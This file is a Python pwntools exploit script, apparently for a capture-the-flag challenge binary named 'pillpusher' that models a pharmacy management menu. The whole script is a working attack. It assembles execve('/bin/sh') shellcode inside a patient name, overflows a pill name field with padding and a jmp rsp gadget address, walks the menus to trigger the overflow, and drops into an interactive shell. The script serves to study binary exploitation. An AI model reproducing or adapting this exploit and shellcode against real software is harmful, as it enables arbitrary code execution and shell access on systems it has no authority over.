from pwn import *

def add_pharmacist(p, name):
    return

def add_patient(p, name, symptom="memes"):

    p.sendline("4")
    p.sendline("1")
    p.sendline(name)
    p.sendline("Y")
    p.sendline(symptom)
    p.sendline("")
    p.sendline("5")
    return

def add_pill(p, name, dosage="0", schedule="0", treats="memes"):

    p.sendline("2")

    p.sendline("1")
    p.recvuntil("Pill Name:")
    p.sendline(name)
    p.sendline(dosage)
    p.sendline(schedule)
    p.sendline(treats)
    p.sendline("")
    p.sendline("")
    p.sendline("")
    p.sendline("6")

def add_pharmacist(p, name, level="1"): 
    p.sendline("3")
    p.sendline("1")
    p.sendline(name)
    p.sendline(level)
    p.sendline("5")


def x_asm(buf):
    return asm(buf, arch="amd64")

jmp_rsp = p64(0x40c06b)

patient_name = x_asm("add rsp, 0x1000")
patient_name += x_asm("add rbp, 0x1000")
patient_name += x_asm("sub rbp, 0x128")
patient_name += x_asm("mov rbx, 0x0068732f6e69622f")
patient_name += x_asm("push rbx")
patient_name += x_asm("mov rdi, rbp")
patient_name += x_asm("xor rsi, rsi")
patient_name += x_asm("xor rdx, rdx")
patient_name += x_asm("mov rax, 59")
patient_name += x_asm("syscall")


pill1_name = "A"*128
pill2_name = "A"*2 + "B"*8 + jmp_rsp +"C"*110
pill3_name = "C"*128
pill4_name = "D"*128
pill5_name = "E"*128

p = process("./pillpusher")

add_patient(p, patient_name)
add_pharmacist(p, "pharmabro")

add_pill(p, pill1_name)
add_pill(p, pill2_name)
add_pill(p, pill3_name)
add_pill(p, pill4_name)
add_pill(p, pill5_name)

# create pharmacy
p.sendline("1")
p.sendline("1")
p.sendline("pharmacy0")

p.sendline(pill1_name)
p.sendline(pill2_name)
p.sendline(pill3_name)
p.sendline(pill4_name)
p.sendline(pill5_name)
p.sendline("")

p.sendline("pharmabro")
p.sendline("")
p.sendline("5")

p.sendline("5")

# select pharmacy
p.sendline("1")
p.sendline("pharmacy0")


# select pharmacist
p.sendline("2")
p.sendline("1")

#select patient
p.sendline("3")
p.sendline(patient_name)

p.sendline("4")
p.sendline("-1")

#gdb.attach(p, "break *0x40c06b\n c")
p.sendline(pill1_name)
p.sendline(pill1_name)
p.sendline(pill1_name)
p.sendline(pill1_name)
p.sendline(pill2_name)
p.sendline("")

p.interactive()
